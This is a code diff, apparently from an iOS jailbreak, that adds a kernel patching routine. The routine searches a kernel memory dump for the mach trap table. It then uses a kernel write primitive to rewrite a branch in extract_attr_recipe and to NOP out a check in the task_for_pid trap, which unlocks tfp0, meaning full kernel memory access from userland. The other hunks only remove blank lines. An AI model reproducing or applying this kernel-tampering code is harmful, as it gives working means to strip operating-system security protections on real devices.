@@ -549,6 +549,73 @@ RemapPage_(x+PSZ);\
 
     
     /*
+     tfp0 and patch this bug
+     */
+    {
+        uint64_t endf = prelink_base+prelink_size;
+        uint64_t ends = whole_size - (endf - whole_base);
+        char* sbstr = memmem(whole_dump + endf - whole_base, ends, "\x05\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00", 0x10) - 0x18; // vm_allocate_trap
+        
+        sbstr -= 0x20 * 10; // go from vm_allocate_trap to beginning of array
+        
+        
+        uint64_t extract_attr_recipe = *(uint64_t*)(sbstr + 72 * 0x20 + 8 /*fptr*/);
+        
+        uint32_t* opcode_stream = extract_attr_recipe - whole_base + whole_dump;
+        
+        int l = 0;
+        while (1) {
+            if ((opcode_stream[l] & 0xFFFFFC00) == 0x7103FC00) { // find cmp wX, 0xFF
+                int cbz = l;
+                while (1) {
+                    if ((opcode_stream[cbz] & 0xFF000000) == 0xB4000000) {
+                        break;
+                    }
+                    cbz--;
+                }
+                
+                uint64_t ret_target = (opcode_stream[cbz] & 0xFFFFE0) >> 5;
+                ret_target += cbz;
+                
+                
+                int bhi = l;
+                while (1) {
+                    if ((opcode_stream[bhi] & 0xFF000000) == 0x54000000) {
+                        break;
+                    }
+                    bhi++;
+                }
+                
+                ret_target -= bhi;
+                
+                uint32_t new_opcode = opcode_stream[bhi] & (~0xFFFFE0);
+                new_opcode |= (ret_target << 5) & 0xFFFFE0;
+
+                RemapPage(extract_attr_recipe + bhi*4);
+                WriteAnywhere32(NewPointer(extract_attr_recipe+bhi*4), new_opcode);
+                
+                break;
+            }
+            l++;
+        }
+        
+        uint64_t tfp = *(uint64_t*)(sbstr + 45 * 0x20 + 8 /*fptr*/);
+        
+        opcode_stream = tfp - whole_base + whole_dump;
+        
+        int cbz = 0;
+        while (1) {
+            if ((opcode_stream[cbz] & 0xFF000000) == 0x34000000) {
+                break;
+            }
+            cbz++;
+        }
+        
+        RemapPage(tfp + cbz*4);
+        WriteAnywhere32(NewPointer(tfp+cbz*4), 0xd503201f);
+    }
+    
+    /*
      nonceenabler
      */
     
@@ -621,7 +688,6 @@ RemapPage_(x+PSZ);\
             int32_t myreg = (opcode >> 5) & 0x1f;
             uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
             
-            
             WriteAnywhere64(rgz, physcode+0x200);
             break;
         }
@@ -645,10 +711,6 @@ RemapPage_(x+PSZ);\
         }
         fref += 4;
     }
-    
-    
-
-
     
     {
         /*
